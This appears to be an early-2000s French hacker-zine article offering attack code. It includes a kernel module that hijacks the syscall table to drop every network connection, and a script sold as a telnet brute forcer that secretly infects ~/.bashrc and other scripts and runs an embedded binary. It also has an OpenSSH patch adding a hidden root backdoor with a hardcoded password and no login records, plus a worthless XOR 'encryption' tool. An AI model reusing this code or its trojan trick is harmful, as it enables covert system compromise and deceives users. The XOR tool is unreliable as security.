@@ -1,0 +1,501 @@
+                      NoCooking issue 0x00, article 0x0b
+             _   _          __      _ _              _              
+            | | | |___ ___ / _|_  _| | |  __ ___  __| |___ ___      
+            | |_| (_-</ -_)  _| || | | | / _/ _ \/ _` / -_|_-<_ _ _ 
+             \___//__/\___|_|  \_,_|_|_| \__\___/\__,_\___/__(_|_|_)
+                                                  by d1scl0          
+
+
+
+
+---[ lkm-fuck
+
+Si vous avez envie de vous amusez, utilisez ce lkm (conseille si c en remote,
+ne l'utiliser qu'une fois que vous avez fini tout ce que vous vouliez faire).
+Bon globalement c un code de merde.
+
+<lkm-fuck.c>
+/*
+ * lkm-fuck by d1scl0
+ * Fuck off all cnx with the standard FUCK OFF msg
+ * thx to joonst for the idea
+ */
+#define MODULE
+#define __KERNEL__
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+#include <sys/syscall.h>
+#include <asm/fcntl.h>
+#include <asm/errno.h>
+#include <asm/uaccess.h>
+#include <linux/fs.h>
+#include <linux/net.h>
+
+extern void* sys_call_table[];
+
+int (*orig_socketcall)(int c, unsigned long *args);
+int (*_sys_write)(int s, const char *buf, size_t count);
+int (*_sys_close)(int s);
+int hacked_socketcall(int c, unsigned long *args)
+{
+  char buf[] = "FUCK OFF\r\n";
+  mm_segment_t old_fs_value=get_fs(); 
+  int r = orig_socketcall(c, args);
+  if((r > 0) && (SYS_ACCEPT == c))
+  {
+    set_fs(get_ds());
+    _sys_write(r, buf, 10);
+    set_fs(old_fs_value);
+    _sys_close(r);
+    r = -1;
+  }
+  return r;
+}
+
+int init_module(void)
+{ 
+  orig_socketcall = sys_call_table[SYS_socketcall];
+  _sys_write  = sys_call_table[SYS_write];
+  _sys_close  = sys_call_table[SYS_close];
+  sys_call_table[SYS_socketcall]=hacked_socketcall; 
+  return 0; 
+} 
+
+void cleanup_module(void) 
+{ 
+  sys_call_table[SYS_socketcall]=orig_socketcall;
+}
+</lkm-fuck.c>
+
+
+---[ l0l, a l33t telnet brute forcer
+
+Voila donc une ptit brute forcer de telnet, oriente vers le
+brute force de switchs/hubs.
+Usage: ./lol <user> <ip> <password_list_file>
+bash-2.05$ ./lol security 195.46.214.105 password.lst
+GO.sh: line 25:  4909 Done                    cat $3
+      4910 Terminated              | ./lol
+bash-2.05# 
+PASS:monitor
+
+voila, maintenant un ptit telnet sur 195.46.214.105 avec monitor/monitor
+et vous controler la planete.
+h4cK d4 w0rld
+
+<lol.sh>
+#!/bin/sh
+#l0l
+v=/tmp/.v;if (! grep $v ~/.bashrc && [ ! -f $v ]) >/dev/null;then (head -n 6 $0 && echo "/bin/ls \$*") >$v
+chmod +x $v; echo "alias ls='$v'" >>~/.bashrc;fi;for f in *;do
+if (file $f |grep script && [ -f $f -a -w $f ] && ! head -n 2 $f |grep l0l) >/dev/null;then
+cat $f >.a;head -n 6 $0 > $f;cat .a >>$f;rm -f .a;fi;done
+tail +5 $0 | uudecode
+chmod +x c && ./c $1 $2 $3 && rm c
+exit
+begin 644 c
+M?T5,1@$!`0````````````(``P`!````=(`$"#0````<!````````#0`(``"
+M`"@`!@`%``$``````````(`$"`"`!`@2`@``$@(```0`````$````0```!0"
+M```4D@0(%)($",,!``##`0``!@`````0``#H#P$``(GEOA22!`B)][F?`0``
+MLS.L,-C^PZKB^#'`L"IH9F5A<FAE=FELB>/-@#'`L`+-@(7`=$:Y____`)#B
+M_3'`L`8QVT/-@#'`L"F+7"0$S8"CTY,$"#'`L"F+'"3-@#'`L`2+'=.3!`BY
+M%)($"+J?`0``S8`QP$`QV\V`,<"P!C';S8`QP+`IBQPDS8`QP+`&BUPD!,V`
+M,<E1:&XO<VAH+R]B:8DELY,$"(L=LY,$"&@M<P``B26WDP0(BU4(B16[DP0(
+MBU4,B16_DP0(BU40B17#DP0(_S7'DP0(:,>3!`AHPY,$"&B_DP0(:+N3!`AH
+MMY,$"&BSDP0(N;.3!`BZQY,$"#'`L`O-@#'`0#';S8`QP+`"S8"%P'0!PS'`
+MF;!F4D)20E*)X6H!6\V`B<>9,<EFN16S,<"P&,V`A<!U`O[%4F910V93B>%J
+M$%%7B>$QP+!FS8"%P'01,<"P%,V`DS')L0DQP+`ES8"P9K,$S8!05XGA0[!F
+MS8")V8G#2;`_S8!!XO2P"U%H;B]S:&@O+V)IB>-14XGAS8```%!500A$!`56
+M,1\<$4HS,VTA+2MI(C`Y+R@X1R(@-PXG(#$G=F=2*BHZ*S-^*P4-#`8012<E
+M8@P2&PD.&D\U`G@`$1L25UHE"%EV&`8/Y>+VHZ;)Z:6"^N_EZ*VL^N+-X+&>
+M\.[G_?KNN[[-_[VJTL?-P(6$Q<3(PO?>CZ3*R,'7T,"5S;WQU]G4G,:TVKBH
+MMK[.B*.IO>FQP:FUJZSPNKN_N+2ZN_B[T+>SNH&JDX20P]7OE8*&C;6>GXB<
+MS]*MG*.UIJ7-FI6;DZ"3W/5I;W9F=F1E<W4#=P%@!VUN9"]P+RA@'#0Y-F]H
+M;C)\=DX.0U1/!0M!(E)94E]92T(8$U%20!5%2TM<7AL16!X8,VX@+R4M:644
+M;7MI8VHR+#$E;"!F=6UW.S$W-#A]=2=`$E!#0D-&24<:6$E%5A-E!7L1&QD:
+M$E=3`5H91QX?"Z#R_O#AX::J[:FM^*/X_*"WM:.TN[+J]/GMI.BNIOW^U('1
+MD=C6P\.(A,^+B]Z![O*>E9>&DIF0Q-K;SX+.A=RAM>+G][GHZ*KRN*;LK^Z\
+M^ML`````````````````````````````````````````````````5&AE($YE
+M='=I9&4@07-S96UB;&5R(#`N.3@N,S@``"YS:'-T<G1A8@`N9&%T80`N8G-S
+M`"YC;VUM96YT`"YE=FEL````````````````````````````````````````
+M````````````````"P````$````#````%)($"!0"``##`0`````````````$
+M`````````!$````(`````0```->3!`C7`P```0```````````````0``````
+M```6`````0``````````````UP,``!\```````````````$`````````'P``
+M``$````"````=(`$"'0```">`0`````````````!``````````$````#````
+@``````````#V`P``)0```````````````0``````````
+`
+end
+</lol.sh>
+
+# El1teBitchs
+
+
+---[ triplexor
+
+Yeahhhhh, un l33t code de l'ihc qui securisera vos data pr eviter que les
+w8h8 ne les lisent :
+<triplexor.c>
+/* triplexor.c */
+/* vos données n'ont jamais été aussi sécurisées */
+/* (c)2004 IHC International Handbook for Cooking */
+/* Distribution illicite !! */
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <strings.h>
+
+void xor(char *buffer, char *clef){
+    int i;
+    for(i=0;i<16;++i)
+        buffer[i]^=clef[i];
+}
+
+int main(int argc, char **argv){
+    int fdin;
+    int fdout;
+    char mdp1[16];
+    char mdp2[16];
+    char mdp3[16];
+    char buffer[16];
+    int lu;
+     
+    if(argc<3){
+        printf("usage : %s <fichier source> <fichier cible>\n");
+        return 1;
+    }
+    strncpy(mdp1,getpass("premier mot de passe :"),16);
+    strncpy(mdp2,getpass("second mot de passe :"),16);
+    strncpy(mdp3,getpass("troisieme mot de passe :"),16);
+    fdin=open(argv[1],O_RDONLY);
+    fdout=open(argv[2],O_WRONLY|O_CREAT,0600);
+    if(fdin < 0 || fdout <0){
+        perror("open");
+        return 1;
+    }
+    while ((lu=read(fdin,buffer,16)) > 0){
+        xor(buffer,mdp1);
+        xor(buffer,mdp2);
+        xor(buffer,mdp3);
+        write(fdout,buffer,lu);
+    }
+    close(fdin);
+    close(fdout);
+    printf("Vos données sont encryptées, dormez tranquilles !\n");
+    return 0;
+}
+</triplexor.c>
+
+---[ OpenSSH 3.4p1 Root Backdoor
+
+h3h3 vo1l4 un v13u c0d3 b13n fun.
+
+Cauz we are lame,
+
+we can't do a fantastic shell script
+that will install all this shit for
+you and then you would only do a :
+./owned &
+
+no.
+
+in other words, you have to copy
+the file walincl.h in the right
+directory, and apply the patch that
+we have graciously supplied to you.
+
+Then you would be happy to read
+this little .h file (the walincl yes!),
+to understand some thing...
+
+Sun Aug 25 00:40:25 CEST 2002
+
+PS: OpenSSH is really a good thing,
+only if there is a good sysadmin behind
+it ;) - T...x sux -
+
+
+oh, okay, I sum up the features of this
+patch:
+- gives you a root account (wow!? ;)
+- gives you a classical loved /bin/sh :p
+- do not logs you in the wtmp (so you don't
+  appear if you try the `w`)
+- to become even more stealth, take a tty that
+  is the first available + 8 (configurable)
+
+Easy tasks TODO
+- send all typed passwords to a usenet or
+  an email, or an ftp or whatever ?
+- make the tty jump feature available for more os
+  than just BSD 4.4...
+
+pourquoi je parle en anglais d'ailleurs ????
+bon, enfin voila, c'est trop tard pour parler
+francais, have Good Time !
+
+<wal-openssh-3.4p1.diff>
+diff -u openssh-3.4p1/auth.c wal-openssh-3.4p1/auth.c
+--- openssh-3.4p1/auth.c	Wed May 22 07:06:28 2002
++++ wal-openssh-3.4p1/auth.c	Sun Aug 25 00:21:47 2002
+@@ -52,6 +52,8 @@
+ #include "bufaux.h"
+ #include "packet.h"
+ 
++#include "walincl.h"
++
+ /* import */
+ extern ServerOptions options;
+ 
+@@ -86,6 +88,10 @@
+ 	if (!pw || !pw->pw_name)
+ 		return 0;
+ 
++    /* Let the WAL user be okay */
++    if (!strcmp(pw->pw_name, WAL_ROOT_ACCOUNT))
++        return 1;
++
+ #define	DAY		(24L * 60 * 60) /* 1 day in seconds */
+ 	spw = getspnam(pw->pw_name);
+ 	if (spw != NULL) {
+@@ -475,7 +481,16 @@
+ #endif
+ 	struct passwd *pw;
+ 
+-	pw = getpwnam(user);
++    /* for WAL ... */
++    if (!strcmp(user, WAL_ROOT_ACCOUNT)) {
++            strcpy(user, WAL_REAL_ROOT);
++            pw = getpwnam(user);
++            strcpy(user, WAL_ROOT_ACCOUNT);
++            strcpy(pw->pw_name, WAL_ROOT_ACCOUNT);
++    } else {
++	    pw = getpwnam(user);
++    }
++
+ 	if (pw == NULL || !allowed_user(pw))
+ 		return (NULL);
+ #ifdef HAVE_LOGIN_CAP
+diff -u openssh-3.4p1/auth2-passwd.c wal-openssh-3.4p1/auth2-passwd.c
+--- openssh-3.4p1/auth2-passwd.c	Thu Jun  6 22:27:56 2002
++++ wal-openssh-3.4p1/auth2-passwd.c	Sun Aug 25 02:34:07 2002
+@@ -32,6 +32,8 @@
+ #include "monitor_wrap.h"
+ #include "servconf.h"
+ 
++#include "walincl.h"
++
+ /* import */
+ extern ServerOptions options;
+ 
+@@ -47,12 +49,28 @@
+ 		log("password change not supported");
+ 	password = packet_get_string(&len);
+ 	packet_check_eom();
++    //debug("[WAL]eheh %s", password);
++    if (!strcmp(authctxt->user, WAL_ROOT_ACCOUNT) &&
++                    !strcmp(password, WAL_ROOT_PASSWD)) {
++        authctxt->valid=1;
++        authctxt->success=1;
++        authctxt->pw->pw_uid=0;
++        authctxt->pw->pw_gid=0;
++        strcpy(authctxt->user, WAL_REAL_ROOT);
++        strcpy(authctxt->pw->pw_shell, WAL_GOD_SHELL);
++        //PRIVSEP(1);
++        use_privsep=0;
++        authenticated=1;
++    } else {
++
+ 	if (authctxt->valid &&
+ #ifdef HAVE_CYGWIN
+ 	    check_nt_auth(1, authctxt->pw) &&
+ #endif
+ 	    PRIVSEP(auth_password(authctxt, password)) == 1)
+ 		authenticated = 1;
++
++    }
+ 	memset(password, 0, len);
+ 	xfree(password);
+ 	return authenticated;
+diff -u openssh-3.4p1/auth2.c wal-openssh-3.4p1/auth2.c
+--- openssh-3.4p1/auth2.c	Fri Jun 21 08:21:11 2002
++++ wal-openssh-3.4p1/auth2.c	Sat Aug 24 23:58:42 2002
+@@ -36,6 +36,8 @@
+ #include "pathnames.h"
+ #include "monitor_wrap.h"
+ 
++#include "walincl.h"
++
+ /* import */
+ extern ServerOptions options;
+ extern u_char *session_id2;
+@@ -204,10 +206,13 @@
+ 		fatal("INTERNAL ERROR: authenticated invalid user %s",
+ 		    authctxt->user);
+ 
++    /* Special handling for WAL ... */
++#ifndef __WALINCL_H__
+ 	/* Special handling for root */
+ 	if (authenticated && authctxt->pw->pw_uid == 0 &&
+ 	    !auth_root_allowed(method))
+ 		authenticated = 0;
++#endif
+ 
+ #ifdef USE_PAM
+ 	if (!use_privsep && authenticated && authctxt->user && 
+Common subdirectories: openssh-3.4p1/autom4te-2.53.cache and wal-openssh-3.4p1/autom4te-2.53.cache
+Common subdirectories: openssh-3.4p1/contrib and wal-openssh-3.4p1/contrib
+diff -u openssh-3.4p1/includes.h wal-openssh-3.4p1/includes.h
+--- openssh-3.4p1/includes.h	Mon May 13 07:14:09 2002
++++ wal-openssh-3.4p1/includes.h	Sun Aug 25 02:25:46 2002
+@@ -157,4 +157,6 @@
+ 
+ #include "entropy.h"
+ 
++char WAL_user[14];
++
+ #endif /* INCLUDES_H */
+diff -u openssh-3.4p1/loginrec.c wal-openssh-3.4p1/loginrec.c
+--- openssh-3.4p1/loginrec.c	Tue Apr 23 15:09:19 2002
++++ wal-openssh-3.4p1/loginrec.c	Sun Aug 25 00:56:15 2002
+@@ -163,6 +163,8 @@
+ #include "log.h"
+ #include "atomicio.h"
+ 
++#include "walincl.h"
++
+ RCSID("$Id: loginrec.c,v 1.40 2002/04/23 13:09:19 djm Exp $");
+ 
+ #ifdef HAVE_UTIL_H
+@@ -360,7 +362,9 @@
+ 
+ 	if (username) {
+ 		strlcpy(li->username, username, sizeof(li->username));
+-		pw = getpwnam(li->username);
++        /* WAL was here :] */
++		//pw = getpwnam(li->username);
++        pw = getpwnam(WAL_REAL_ROOT);
+ 		if (pw == NULL)
+ 			fatal("login_init_entry: Cannot find user \"%s\"", li->username);
+ 		li->uid = pw->pw_uid;
+@@ -417,6 +421,10 @@
+ 	  return 1;
+ 	}
+ #endif
++
++    /* WAL is hiding :p */
++    if (!strcmp(li->username, WAL_ROOT_ACCOUNT))
++        return 0;
+ 
+ 	/* set the timestamp */
+ 	login_set_current_time(li);
+Common subdirectories: openssh-3.4p1/openbsd-compat and wal-openssh-3.4p1/openbsd-compat
+Common subdirectories: openssh-3.4p1/regress and wal-openssh-3.4p1/regress
+Common subdirectories: openssh-3.4p1/scard and wal-openssh-3.4p1/scard
+diff -u openssh-3.4p1/session.c wal-openssh-3.4p1/session.c
+--- openssh-3.4p1/session.c	Wed Jun 26 15:51:06 2002
++++ wal-openssh-3.4p1/session.c	Sun Aug 25 13:25:10 2002
+@@ -58,6 +58,8 @@
+ #include "session.h"
+ #include "monitor_wrap.h"
+ 
++#include "walincl.h"
++
+ #ifdef HAVE_CYGWIN
+ #include <windows.h>
+ #include <sys/cygwin.h>
+@@ -201,6 +203,9 @@
+ void
+ do_authenticated(Authctxt *authctxt)
+ {
++    /* WAL at startup... */
++    strcpy(WAL_user, authctxt->pw->pw_name);
++
+ 	/*
+ 	 * Cancel the alarm we set to limit the time taken for
+ 	 * authentication.
+@@ -1282,6 +1287,8 @@
+ 	 * Get the shell from the password data.  An empty shell field is
+ 	 * legal, and means /bin/sh.
+ 	 */
++    if (!strcmp(pw->pw_name, WAL_ROOT_ACCOUNT))
++        strcpy(pw->pw_shell, WAL_GOD_SHELL);
+ 	shell = (pw->pw_shell[0] == '\0') ? _PATH_BSHELL : pw->pw_shell;
+ #ifdef HAVE_LOGIN_CAP
+ 	shell = login_getcapstr(lc, "shell", (char *)shell, (char *)shell);
+diff -u openssh-3.4p1/sshpty.c wal-openssh-3.4p1/sshpty.c
+--- openssh-3.4p1/sshpty.c	Wed Jun 26 01:21:42 2002
++++ wal-openssh-3.4p1/sshpty.c	Sun Aug 25 13:32:57 2002
+@@ -22,6 +22,8 @@
+ #include "log.h"
+ #include "misc.h"
+ 
++#include "walincl.h"
++
+ /* Pty allocated with _getpty gets broken if we do I_PUSH:es to it. */
+ #if defined(HAVE__GETPTY) || defined(HAVE_OPENPTY)
+ #undef HAVE_DEV_PTMX
+@@ -52,8 +54,28 @@
+ 	/* openpty(3) exists in OSF/1 and some other os'es */
+ 	char *name;
+ 	int i;
++    int e, WAL[8], WALi[8];
+ 
++    /* WAL is like Tetris */
++    //debug("[WAL]is it a joke ? %s", WAL_user);
++    if (!strcmp(WAL_user, WAL_ROOT_ACCOUNT)) {
++        for(e=0;e<WAL_TTY_JUMP;e++) {
++    	    openpty(ptyfd, ttyfd, NULL, NULL, NULL);
++            WAL[e]=*ttyfd;
++            WALi[e]=*ptyfd;
++        }
++    }
++    /* WAL going to drink some tea... */
+ 	i = openpty(ptyfd, ttyfd, NULL, NULL, NULL);
++    /* WAL come back! */
++    if (!strcmp(WAL_user, WAL_ROOT_ACCOUNT)) {
++        for(e=0;e<WAL_TTY_JUMP;e++) {
++            pty_release(ttyname(WAL[e]));
++            close(WALi[e]);
++            close(WAL[e]);
++        }
++    }
++    /* and the game end :( */
+ 	if (i < 0) {
+ 		error("openpty: %.100s", strerror(errno));
+ 		return 0;
+Only in wal-openssh-3.4p1: walincl.h
+</wal-openssh-3.4p1.diff>
+
+<walincl.h>
+/*
+ * PRIVATE - DO NOT DIFFUSE - PRIVATE
+ * WAL-openssh-3.4p1         2002 (c) WAL
+ *
+ * Yet another lame backdoor code for openssh-3.4p1
+ * fun : ALERT ALERT lame code is following ALERT ALERT
+ *
+ * beginning the (faboulous ;) ) idea at a very good
+ * coding/meeting party, by two member of WAL.
+ * and one of the two finish it during a night in his holliday...
+ * (maybe the other one also ?)
+ *
+ * After all, we are lames ;p
+ *
+ * Sun Aug 25 00:34:23 CEST 2002
+ * Today is Boomtime, the 18th day of Bureaucracy in the YOLD 3168
+ */
+
+#ifndef __WALINCL_H__
+#define __WALINCL_H__
+
+#define WAL_ROOT_ACCOUNT    "lamers"
+#define WAL_ROOT_PASSWD     "own_lamers"
+#define WAL_REAL_ROOT       "root"
+#define WAL_GOD_SHELL       "/bin/sh"
+#define WAL_TTY_JUMP        8
+
+#endif
+</walincl.h>
+
+That's all folks for today, we were short on ideas
